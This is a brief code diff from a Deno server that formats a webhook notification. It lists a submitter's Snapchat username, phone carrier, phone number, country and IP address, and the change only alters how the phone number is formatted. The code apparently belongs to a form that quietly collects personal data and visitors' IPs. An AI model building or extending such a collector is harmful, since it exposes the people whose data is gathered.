@@ -38,7 +38,7 @@ Deno.serve(async (req) => {
     fields: [
       { name: "👤 Utilisateur", value: `@${snapchat}`, inline: true },
       { name: "📡 Opérateur", value: operateur, inline: true },
-      { name: "📞 Numéro", value: formatPhoneRaw(telephone), inline: true },
+      { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
       { name: "🌍 Pays", value: "France", inline: true },
       { name: "🕵️ Adresse IP", value: `\`${ip}\``, inline: false },
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
